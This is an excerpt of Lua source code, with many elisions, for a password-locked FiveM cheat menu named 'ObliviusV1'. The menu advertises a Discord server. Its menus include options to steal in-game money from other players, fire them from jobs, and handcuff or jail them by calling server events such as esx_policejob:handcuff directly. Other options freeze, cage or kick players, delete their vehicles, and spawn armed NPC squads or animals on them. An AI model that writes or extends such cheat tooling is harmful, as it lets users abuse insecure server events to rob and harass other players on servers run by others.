                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					...
					elseif oblV1.Button('Clone Car') then
                    ClonePedVeh()
					elseif oblV1.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    ...
                    elseif oblV1.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
                    elseif oblV1.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
                    elseif oblV1.Button("Spawn Flare On Player") then
                    ...
                    elseif oblV1.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if oblV1.MenuButton('~h~~p~»~s~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                oblV1.Display()
            elseif oblV1.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if oblV1.MenuButton('~h~~p~»~s~ ~h~~p~»~s~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                oblV1.Display()
            elseif oblV1.IsMenuOpened('CarOptions') then
                if oblV1.Button('~h~~r~Spawn Car') then
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if oblV1.MenuButton('~h~~p~»~s~ ~h~~p~»~s~ ' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened('MainTrailerSpa') then
                if oblV1.Button('~h~~r~Spawn Car') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    ...
                    oblV1.Display()
                elseif oblV1.IsMenuOpened("PlayerESXMenu") then
                    if oblV1.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif oblV1.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
                    end

                    oblV1.Display()
                elseif oblV1.IsMenuOpened("PlayerESXTriggerMenu") then
                    if oblV1.Button("ESX Revive") then
                    ...
                    DoScreenFadeIn(800)
					elseif oblV1.Button("Fire player from job (ESX)") then
				    FirePlayer(SelectedPlayer)
                    elseif oblV1.Button("ESX Give Money To Player From Your Wallet") then
                    ...
                    elseif oblV1.Button("ESX Steal Money From Player") then
                    ...
                    elseif oblV1.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif oblV1.Button("ESX Send To Jail") then
                    ...
                    oblV1.Display()
                elseif oblV1.IsMenuOpened("PlayerESXJobMenu") then
                    if oblV1.Button("Unemployed") then
                    ...
                    oblV1.Display()
                elseif oblV1.IsMenuOpened("PlayerTrollMenu") then
                    if oblV1.Button ("Fake Chat Message") then
				...
				elseif oblV1.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif oblV1.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif oblV1.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif oblV1.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif oblV1.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    elseif oblV1.Button("Cage Player") then
                        freezePlayer = true
                        Citizen.Wait(10)
                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                        freezePlayer = false
                    elseif oblV1.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
                    elseif oblV1.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                ...
                elseif oblV1.IsMenuOpened("SpawnPropsMenu") then
                    ...
                    then
                    elseif oblV1.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif oblV1.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif oblV1.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif oblV1.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    oblV1.Display()
            elseif oblV1.IsMenuOpened("VehicleRamMenu") then
                if oblV1.Button("Futo") then
                ...
                elseif oblV1.Button("Bus") then
                    ...
                    oblV1.Display()
            elseif oblV1.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if oblV1.Button(allWeapons[i]) then
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("WeaponMenu") then
                if oblV1.MenuButton("Single Weapon Spawner", "SingleWeaponMenu") then
                elseif oblV1.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                ...
                then
                elseif oblV1.MenuButton("Weapon Customization", "WeaponCustomization") then
                elseif oblV1.MenuButton("Bullet Gun Options", "BulletGunMenu") then
                end

                oblV1.Display()
            elseif oblV1.IsMenuOpened("WeaponCustomization") then
                if oblV1.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif oblV1.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif oblV1.Button("~g~Add Special Finish") then
                ...
                elseif oblV1.Button("~r~Remove Special Finish") then
                ...
                elseif oblV1.Button("~g~Add Suppressor") then
                ...
                elseif oblV1.Button("~r~Remove Suppressor") then
                ...
                elseif oblV1.Button("~g~Add Scope") then
                ...
                elseif oblV1.Button("~r~Remove Scope") then
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("BulletGunMenu") then
                if oblV1.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                ...
                then
                elseif oblV1.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif oblV1.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                ...
                then
                elseif oblV1.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                ...
                then
                elseif oblV1.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if oblV1.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
            ...
            elseif IsDisabledControlPressed(0, 162) then
                if logged then
                    oblV1.OpenMenu("MainMenu")
                else
                    local temp = KeyboardInput("Enter Password| ObliviusV1 by LuaMenuFr#0221 |Discord.gg/9ZxpCtb", "", 100)
                    if temp == dEI then
                        drawNotification("~g~Login Succesful!")
                        logged = true
                        oblV1.OpenMenu("MainMenu")
                    else
                        drawNotification("~r~Login has failed, wrong key dude")
                    end
                end
            end
